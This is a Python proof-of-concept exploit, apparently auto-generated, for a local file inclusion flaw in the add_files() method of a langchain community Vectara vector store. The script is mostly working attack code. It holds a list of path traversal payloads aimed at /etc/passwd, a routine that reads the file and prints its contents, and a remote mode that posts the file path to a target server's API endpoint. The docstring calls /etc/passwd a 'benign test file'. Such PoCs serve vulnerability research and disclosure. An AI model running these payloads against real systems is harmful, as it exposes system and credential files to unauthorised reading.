#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: lfi-004
# Sink: add_files
# Auto-generated — run with: python3 lfi_provide_like_add_files_12.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for LFI vulnerability in langchain-community-only Vectara vector store.

Vulnerability: The add_files() method in Vectara class directly uses user-supplied file paths
in an open() call without path validation or sanitization. The only check is os.path.exists(),
which does not prevent path traversal attacks.

Impact: An attacker can read arbitrary files from the server's filesystem by providing
malicious paths like '../../etc/passwd'.

This PoC demonstrates the vulnerability by reading /etc/passwd (or a benign test file).
"""

import os
import sys
import json
import tempfile
import requests
from pathlib import Path

# Configuration - modify these as needed
TARGET_HOST = "http://localhost:8000"  # Target server running the vulnerable app
API_ENDPOINT = "/api/v1/trigger"       # Endpoint that calls from_files()
BENIGN_TEST_FILE = "/etc/passwd"       # File to read (safe default)
# For testing locally without a real server, set to True
LOCAL_TEST = True

def create_test_file():
    """Create a test file to demonstrate the vulnerability locally."""
    test_content = "This is a test file to demonstrate LFI vulnerability."
    test_path = os.path.join(tempfile.gettempdir(), "poc_test_file.txt")
    with open(test_path, 'w') as f:
        f.write(test_content)
    return test_path

def simulate_vulnerable_call(file_path):
    """
    Simulate the vulnerable code path from Vectara.add_files().
    
    This replicates the exact vulnerable logic:
    1. Check if file exists (os.path.exists)
    2. Open the file with open(file, 'rb')
    3. Upload to external API (simulated here)
    """
    print(f"[*] Attempting to read file: {file_path}")
    
    # Step 1: Check if file exists (vulnerable check - doesn't prevent traversal)
    if not os.path.exists(file_path):
        print(f"[-] File {file_path} does not exist")
        return False
    
    # Step 2: Open the file (VULNERABLE - no path validation)
    try:
        with open(file_path, 'rb') as f:
            content = f.read()
            print(f"[+] Successfully read file: {file_path}")
            print(f"[+] File contents ({len(content)} bytes):")
            print("-" * 50)
            # Only print first 500 bytes for safety
            print(content[:500].decode('utf-8', errors='replace'))
            print("-" * 50)
            return True
    except Exception as e:
        print(f"[-] Error reading file: {e}")
        return False

def test_path_traversal():
    """Test various path traversal payloads."""
    test_payloads = [
        "../../etc/passwd",
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "....//....//etc/passwd",
        "%2e%2e%2fetc%2fpasswd",  # URL encoded
    ]
    
    print("\n[*] Testing path traversal payloads...")
    for payload in test_payloads:
        print(f"\n[*] Testing payload: {payload}")
        simulate_vulnerable_call(payload)

def main():
    """Main PoC execution."""
    print("=" * 60)
    print("LFI Exploit PoC for langchain-community-only Vectara")
    print("=" * 60)
    
    if LOCAL_TEST:
        print("\n[*] Running local simulation...")
        
        # Create a test file first
        test_file = create_test_file()
        print(f"[*] Created test file: {test_file}")
        
        # Test with normal file (should work)
        print("\n[*] Testing with normal file path...")
        simulate_vulnerable_call(test_file)
        
        # Test with path traversal to read /etc/passwd
        print("\n[*] Testing with path traversal to read /etc/passwd...")
        simulate_vulnerable_call(BENIGN_TEST_FILE)
        
        # Test multiple traversal payloads
        test_path_traversal()
        
        # Clean up test file
        os.remove(test_file)
        print(f"\n[*] Cleaned up test file: {test_file}")
        
    else:
        # Remote exploitation attempt
        print(f"\n[*] Attempting remote exploitation against {TARGET_HOST}")
        
        # Craft the malicious payload
        payload = {
            "files": [BENIGN_TEST_FILE]  # Path traversal payload
        }
        
        try:
            response = requests.post(
                f"{TARGET_HOST}{API_ENDPOINT}",
                json=payload,
                timeout=10
            )
            
            if response.status_code == 200:
                print(f"[+] Exploit successful!")
                print(f"[+] Response: {response.text[:500]}")
            else:
                print(f"[-] Exploit failed with status code: {response.status_code}")
                print(f"[-] Response: {response.text[:200]}")
                
        except requests.exceptions.ConnectionError:
            print(f"[-] Could not connect to {TARGET_HOST}")
            print("[-] Make sure the target server is running")
        except requests.exceptions.Timeout:
            print("[-] Request timed out")
        except Exception as e:
            print(f"[-] Error: {e}")

if __name__ == "__main__":
    main()
